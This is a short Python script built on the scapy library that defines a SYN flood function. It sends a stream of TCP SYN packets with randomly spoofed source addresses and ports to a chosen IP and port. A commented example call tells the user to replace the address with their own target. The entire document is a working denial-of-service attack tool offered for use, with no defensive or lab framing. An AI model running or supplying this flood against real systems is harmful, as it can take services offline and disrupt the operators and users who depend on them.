
from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port, count=1000):
    print(f"[*] Initiating SYN Flood on {target_ip}:{target_port}...")
    for x in range(0, count):
        # Generate a random source IP address
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # Generate a random source port
        src_port = random.randint(1024, 65535)

        # Craft the IP packet (source and destination)
        ip_packet = IP(src=src_ip, dst=target_ip)
        # Craft the TCP packet (SYN flag set, random source port, target port)
        tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")

        # Combine IP and TCP packets
        packet = ip_packet / tcp_packet
        
        # Send the packet without waiting for a response
        send(packet, verbose=0)
        if x % 100 == 0:
            print(f"    Sent {x} SYN packets...")
    print(f"[*] SYN Flood completed. Sent {count} packets.")

# Example usage:
# syn_flood("192.168.1.100", 80, 5000) # Replace with your target IP and port
